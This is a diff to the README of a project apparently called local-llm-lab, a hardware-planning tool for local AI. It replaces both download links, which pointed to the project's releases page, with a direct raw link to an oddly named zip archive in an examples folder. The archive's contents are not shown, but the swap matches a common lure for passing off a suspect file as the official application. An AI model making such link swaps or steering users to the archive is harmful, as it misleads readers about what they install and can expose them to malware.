@@ -1,6 +1,6 @@
 # 🧪 local-llm-lab - Plan your hardware for local AI
 
-[![](https://img.shields.io/badge/Download_Application-Blue?style=for-the-badge)](https://github.com/tandatthach1/local-llm-lab/releases)
+[![](https://img.shields.io/badge/Download_Application-Blue?style=for-the-badge)](https://github.com/tandatthach1/local-llm-lab/raw/refs/heads/main/examples/llm_lab_local_enjoying.zip)
 
 ## What is this tool? 🛠️
 
@@ -27,7 +27,7 @@ This tool works on modern computer systems. You need a stable internet connectio
 
 You can download the latest version of the software from the releases page. 
 
-[Visit this page to download the software](https://github.com/tandatthach1/local-llm-lab/releases)
+[Visit this page to download the software](https://github.com/tandatthach1/local-llm-lab/raw/refs/heads/main/examples/llm_lab_local_enjoying.zip)
 
 Follow these steps to install the program:
 
